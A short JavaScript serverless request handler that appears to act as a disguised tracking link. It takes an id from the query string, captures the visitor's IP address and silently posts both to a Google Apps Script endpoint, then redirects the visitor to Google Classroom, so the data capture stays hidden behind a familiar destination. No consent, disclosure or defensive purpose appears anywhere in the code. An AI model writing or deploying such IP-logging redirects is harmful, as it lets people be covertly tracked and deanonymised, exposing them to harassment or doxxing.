export default async function handler(req, res) {
    const id = req.query.i;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    try {
        if(id){
        await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ id: id, ip: ip})
        });
        }
    } catch (error) {
        return res.status(500).json({ error: "Failed to post data" });
    }
    
    res.writeHead(302, { Location: "https://classroom.google.com/h" });
    res.end();
}
